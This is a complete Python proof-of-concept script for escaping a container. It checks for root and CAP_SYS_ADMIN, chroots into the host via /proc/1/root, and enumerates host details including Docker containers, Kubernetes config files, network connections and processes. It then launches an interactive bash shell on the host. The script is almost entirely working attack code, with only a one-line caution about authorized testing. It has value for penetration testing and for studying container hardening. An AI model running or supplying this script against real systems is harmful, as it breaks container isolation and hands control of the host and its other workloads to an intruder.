#!/usr/bin/env python3
"""
Extended Container Escape and Host Reconnaissance PoC
-----------------------------------------------------
This script demonstrates an extended proof-of-concept for container escape
via chrooting into the host’s filesystem (using /proc/1/root) and then
enumerates additional host details:
  - Host OS and kernel details
  - Mounted volumes and host mount information
  - Running container workloads (Docker and Kubernetes)
  - Active network connections and running processes
  - Systemd unit status (if available)
  
CAUTION: Use only in authorized security testing environments.
"""

import os
import subprocess
import sys

def run_command(command, timeout=10):
    """Run a shell command and return its output."""
    try:
        result = subprocess.run(
            command, shell=True, check=False,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, timeout=timeout
        )
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error: {str(e)}"

def check_escape_capabilities():
    """Check for required capabilities for container escape."""
    capabilities = {}
    capabilities["proc_1_root_access"] = os.access("/proc/1/root", os.R_OK)
    cap_info = run_command("capsh --print")
    capabilities["cap_sys_admin"] = "cap_sys_admin" in cap_info.lower()
    capabilities["is_root"] = (os.geteuid() == 0)
    print("[*] Escape Capability Check:")
    for k, v in capabilities.items():
        print(f"    {k}: {v}")
    return capabilities

def escape_to_host():
    """
    Attempt to escape the container by chrooting into /proc/1/root.
    After chroot, the process sees the host's filesystem as its root.
    """
    caps = check_escape_capabilities()
    if not (caps["proc_1_root_access"] and caps["cap_sys_admin"] and caps["is_root"]):
        print("[-] Required privileges or /proc/1/root access not available.")
        return False

    host_path = "/proc/1/root"
    # Validate by checking for a key file in the host filesystem
    test_file = os.path.join(host_path, "etc", "os-release")
    if not (os.path.exists(test_file) and os.access(test_file, os.R_OK)):
        print("[-] Cannot read key host file via /proc/1/root. Escape aborted.")
        return False

    try:
        print("[*] Attempting chroot escape using /proc/1/root...")
        os.chroot(host_path)
        os.chdir("/")  # Ensure we are in the new root
        print("[+] chroot successful! Now operating in host filesystem context.")
        return True
    except Exception as e:
        print(f"[-] chroot escape failed: {e}")
        return False

def extended_host_recon():
    """
    After escaping into the host context, enumerate additional host data:
      - OS, kernel, and uptime information
      - Mounted filesystems (from /proc/mounts)
      - Running Docker containers (if available)
      - Kubernetes configurations
      - Active network connections
      - Running processes and, if possible, systemd unit status
    """
    print("\n=== Extended Host Reconnaissance ===\n")
    
    recon_results = {}

    # 1. Basic system info
    recon_results["Kernel & OS Info"] = run_command("uname -a")
    recon_results["OS Release"] = run_command("cat /etc/os-release")
    recon_results["Hostname"] = run_command("cat /etc/hostname")
    recon_results["System Uptime"] = run_command("cat /proc/uptime")

    # 2. Mounted volumes and filesystem mounts
    recon_results["Mounted Filesystems"] = run_command("cat /proc/mounts")
    
    # 3. Check for running Docker containers (if docker is installed)
    docker_check = run_command("which docker")
    if docker_check:
        recon_results["Docker Containers"] = run_command("docker ps -a")
    else:
        recon_results["Docker Containers"] = "Docker not installed or not in PATH"

    # 4. Kubernetes workload inspection (if Kubernetes configs are present)
    if os.path.exists("/etc/kubernetes"):
        kubernetes_files = run_command("find /etc/kubernetes -type f")
        recon_results["Kubernetes Configs"] = kubernetes_files
    else:
        recon_results["Kubernetes Configs"] = "No Kubernetes configuration directory found"

    # 5. Active network connections
    # Try ss, fallback to netstat if ss not available
    if run_command("which ss"):
        recon_results["Active Network Connections"] = run_command("ss -tulnp")
    else:
        recon_results["Active Network Connections"] = run_command("netstat -tulnp")
    
    # 6. Running processes
    recon_results["Process Listing"] = run_command("ps aux")
    
    # 7. Check systemd unit status if systemd is used
    if os.path.exists("/run/systemd/system"):
        recon_results["Systemd Units"] = run_command("systemctl list-units --type=service --state=running")
    else:
        recon_results["Systemd Units"] = "Systemd not detected or not used"

    # Print out the extended recon results
    print("\n===== EXTENDED HOST RECONNAISSANCE RESULTS =====")
    for key, value in recon_results.items():
        print(f"\n--- {key} ---")
        print(value)
    print("==================================================\n")

def main():
    print("==== Extended Container Escape and Host Recon PoC ====")
    print("CAUTION: This script is for authorized testing only.\n")
    
    if escape_to_host():
        extended_host_recon()
        # Optionally, drop into an interactive shell for manual investigation.
        try:
            print("[+] Launching an interactive shell on the host (type 'exit' to quit)...")
            os.execvp("/bin/bash", ["/bin/bash"])
        except Exception as e:
            print(f"[-] Failed to launch interactive shell: {e}")
    else:
        print("[-] Container escape failed. Exiting.")

if __name__ == "__main__":
    main()
